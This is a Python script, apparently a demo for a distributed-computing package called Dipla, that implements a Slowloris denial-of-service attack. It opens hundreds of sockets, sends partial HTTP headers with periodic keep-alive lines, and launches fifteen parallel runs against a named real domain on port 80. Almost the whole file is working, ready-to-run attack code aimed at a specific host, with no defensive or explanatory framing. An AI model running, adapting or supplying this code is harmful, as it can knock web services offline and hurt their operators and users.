from os import path
import sys
# Append to path so that this script can access the dipla package
sys.path.append(path.abspath('../dipla'))

from dipla.api import Dipla


@Dipla.distributable()
def slowloris(target_addr, target_port, number_connections):
    import socket, time
    # Try and open N conncetions
    soc_list = []
    for _ in range(number_connections):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target_addr, target_port))
            s.send("GET /?vacation=sucks HTTP/1.1\r\n".encode('utf-8'))
            s.send("User-Agent: The Dipla Boiz\r\n".encode('utf-8'))
            s.send("Accept-language: en-US,en,q=0.5\r\n".encode('utf-8'))
            soc_list.append(s)
        except socket.error:
            pass

    if len(soc_list) == 0:
        return "Connections to target could not be made"

    keep_alive_count = 0
    while soc_list:
        # Send a keep-alive to each connection
        for s in soc_list:
            try:
                s.send("X-a: 4000\r\n".encode("utf-8"))
                keep_alive_count += 1
            except socket.error:
                soc_list.remove(s)
        time.sleep(15)
    return "Send {} keep-alive requests to target".format(keep_alive_count)


ATTACK_ITERATIONS = 15
target_addrs = ["m1cr0man.com"] * ATTACK_ITERATIONS
target_ports = [80] * ATTACK_ITERATIONS
number_connections = [300] * ATTACK_ITERATIONS
attack_results = Dipla.apply_distributable(slowloris,
                                           target_addrs,
                                           target_ports,
                                           number_connections)

out = Dipla.get(attack_results)

for o in out:
    print(o)
